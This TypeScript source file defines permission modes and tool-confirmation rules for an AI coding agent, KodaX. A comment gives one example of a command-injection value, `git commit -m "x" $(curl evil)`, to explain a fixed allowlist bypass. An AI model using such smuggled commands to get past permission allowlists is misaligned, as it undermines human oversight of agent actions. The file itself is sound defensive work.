/**
 * Permission Types
 */

import type { BashPrefixExtractor } from '@kodax-ai/coding';
import {
  BASH_SAFE_READ_COMMANDS,
  BASH_WRITE_COMMANDS,
  FILE_MODIFICATION_TOOLS,
  MODIFICATION_TOOLS,
} from '@kodax-ai/coding';

// ============== Permission Mode ==============

/**
 * Permission mode
 * - plan: Read-only planning, all modifications blocked unless explicitly whitelisted
 * - accept-edits: File edits auto-approved, shell commands require confirmation
 * - auto: Sandboxed execution with LLM review at the host boundary
 * - full-access: Host execution without sandbox or Auto review
 *
 * `auto-in-project` remains accepted only as a persisted/CLI compatibility
 * input and is immediately normalized to `auto`.
 */
export type CanonicalPermissionMode =
  | "plan"
  | "accept-edits"
  | "auto"
  | "full-access";

export type PermissionMode = CanonicalPermissionMode | "auto-in-project";

export const PERMISSION_MODES: PermissionMode[] = [
  "plan",
  "accept-edits",
  "auto",
  "full-access",
  "auto-in-project", // deprecated alias; behavior identical to 'auto'
];

/**
 * Canonical mode names that should appear in user-facing UI / Shift-Tab
 * cycling (excludes deprecated aliases).
 */
export const CANONICAL_PERMISSION_MODES: CanonicalPermissionMode[] = [
  "plan",
  "accept-edits",
  "auto",
  "full-access",
];

/**
 * Returns true when `mode` is the auto family (canonical 'auto' or the
 * deprecated 'auto-in-project' alias). Use this in conditional branches
 * that need to detect auto-mode without binding to either spelling.
 */
export function isAutoMode(mode: PermissionMode): boolean {
  return mode === "auto" || mode === "auto-in-project";
}

/**
 * Map legacy mode names to their canonical form. v0.7.33: auto-in-project → auto.
 * Use at value-read boundaries (settings load, persisted session restore) so
 * downstream code only ever sees canonical names.
 */
export function canonicalizePermissionMode(mode: PermissionMode): CanonicalPermissionMode {
  return mode === "auto-in-project" ? "auto" : mode;
}

/**
 * Status-bar display name for a permission mode. Title-Case short labels
 * (mirrors Claude Code's `shortTitle` convention in
 * `src/utils/permissions/PermissionMode.ts`):
 *   - `plan`             → `Plan`
 *   - `accept-edits`     → `Edits`
 *   - `auto`             → `Auto`
 *   - `full-access`      → `Full Access`
 *   - `auto-in-project`  → `Auto` (compatibility input only)
 *
 * Single source of truth for command output, startup summaries, and the live
 * Ink status-bar view-model. The former write-only readline StatusBar was
 * removed; Classic continues to use the same display helper in text surfaces.
 */
export function permissionModeDisplayName(mode: PermissionMode): string {
  switch (mode) {
    case "plan":
      return "Plan";
    case "accept-edits":
      return "Edits";
    case "auto":
    case "auto-in-project":
      return "Auto";
    case "full-access":
      return "Full Access";
  }
}

// ============== Confirm Result ==============

export interface ConfirmResult {
  confirmed: boolean;
  always?: boolean;
  runtimeGrantKind?: 'session' | 'persistent';
}

// ============== Tool Categories ==============
//
// v0.7.42 — these two sets are now COMPUTED from `LocalToolDefinition.
// sideEffect` metadata declared on each tool in
// `packages/coding/src/tools/registry.ts`. Previously they were hardcoded
// at this file (`new Set(["write", "edit"])`), which silently drifted
// every time a new write-class tool was added to KodaX — `multi_edit`,
// `insert_after_anchor`, `worktree_*`, `scaffold_*`, `stage_*` and
// friends were all missing from the original sets, so plan-mode and
// gitRoot tracking under-enforced for years.
//
// The snapshot is taken at module load. `listBuiltinToolDefinitions()`
// returns the static built-in roster (extensions / constructed tools
// register AFTER module evaluation and are intentionally excluded —
// these sets describe the KodaX-shipped surface only).
//
// SDK consumers (KodaX Space etc.) and new internal callsites should
// prefer the metadata API directly:
//   - `isToolFileMutation(name)` / `isToolMutation(name)` /
//     `isToolPlanModeAllowed(name)` from `@kodax-ai/coding`
//   - `getAllRegisteredTools().filter(t => t.sideEffect === '…')`
// The sets below are retained for back-compat with existing callsites
// in REPL / executor / InkREPL / src/acp_server.

/**
 * Tools that mutate the local filesystem AND accept a `path` input.
 * Eligible for plan-mode's path-aware escape (writes to
 * `.agent/plan_mode_doc.md` or the system temp dir are permitted; all
 * other paths block).
 *
 * Derived from metadata: `sideEffect === 'mutates-fs'` AND
 * `requiredParams.includes('path')`. Tools that mutate the FS without a
 * `path` input (`undo`, `worktree_*`, construction-staircase tools) are
 * NOT in this set — their plan-mode block reason is computed elsewhere
 * via `isToolPlanModeAllowed()` instead of a path check.
 */
export { FILE_MODIFICATION_TOOLS } from '@kodax-ai/coding';

/**
 * All tools with any observable side effect (`sideEffect !== 'readonly'`).
 *
 * Historically used as the plan-mode block set; today
 * `isToolPlanModeAllowed(name)` from `@kodax-ai/coding` is the canonical
 * gate (it honors `planModeAllowed: true` overrides for tools whose
 * effect is itself part of the planning loop, e.g. `exit_plan_mode` /
 * `task_stop` / `todo_*` / `ask_user_question`). Retained as a derived
 * back-compat alias.
 */
export { MODIFICATION_TOOLS } from '@kodax-ai/coding';

/**
 * Bash commands that have write side-effects (blocked in plan mode).
 *
 * This is a blacklist approach: only explicitly listed commands are blocked here.
 * Additional write detection for redirection and PowerShell cmdlets lives in
 * `permission.ts`.
 */
export { BASH_WRITE_COMMANDS } from '@kodax-ai/coding';

/**
 * Strict whitelist of bash commands considered safe for read-only exploration in plan mode.
 * Any bash command not matching these bases will require user confirmation.
 */
export { BASH_SAFE_READ_COMMANDS } from '@kodax-ai/coding';

// ============== Permission Context ==============

export interface PermissionContext {
  permissionMode: PermissionMode;
  confirmTools: Set<string>;
  gitRoot?: string;
  alwaysAllowTools: string[];
  onConfirm?: (tool: string, input: Record<string, unknown>) => Promise<ConfirmResult>;
  saveAlwaysAllowTool?: (tool: string, input: Record<string, unknown>, allowAll?: boolean) => void;
  switchPermissionMode?: (mode: PermissionMode) => void;
  beforeToolExecute?: (tool: string, input: Record<string, unknown>) => Promise<boolean | string>;
  /**
   * FEATURE_153 (v0.7.38) — Optional LLM-backed bash command prefix extractor.
   * When supplied, `isToolCallAllowed` uses it to extract the SAFE PREFIX of
   * a bash command before matching against allowlist patterns like
   * `Bash(git commit:*)`. This eliminates the pre-FEATURE_153 vulnerability
   * where `git commit -m "x" $(curl evil)` matched the allowlist via naive
   * `command.startsWith` semantics.
   *
   * KodaX REPL bootstrap creates this via `createBashPrefixExtractor` from
   * `@kodax-ai/coding` and threads it here. SDK consumers / tests without
   * LLM access can omit it; legacy startsWith semantics apply (documented
   * as insecure in `matchesBashPatternLegacy`).
   */
  bashPrefixExtractor?: BashPrefixExtractor;
}

/**
 * Compute the base confirmation set for each permission mode.
 *
 * Note: `plan` still lists the standard mutating tools here even though most of
 * them are blocked earlier in the permission pipeline via `getPlanModeBlockReason`.
 * This helper only describes the remaining confirmation step for calls that are
 * not hard-blocked.
 */
export function computeConfirmTools(mode: PermissionMode): Set<string> {
  switch (mode) {
    case "plan":
      return new Set(["bash", "write", "edit", "undo"]);
    case "accept-edits":
      return new Set(["bash"]);
    case "auto":
    case "full-access":
    case "auto-in-project":
      return new Set();
  }
}

export function isPermissionMode(value: string | undefined): value is PermissionMode {
  return value !== undefined && PERMISSION_MODES.includes(value as PermissionMode);
}

export function normalizePermissionMode(
  value: string | undefined,
  fallback?: PermissionMode,
): CanonicalPermissionMode | undefined {
  if (isPermissionMode(value)) {
    return canonicalizePermissionMode(value);
  }

  return fallback === undefined ? undefined : canonicalizePermissionMode(fallback);
}
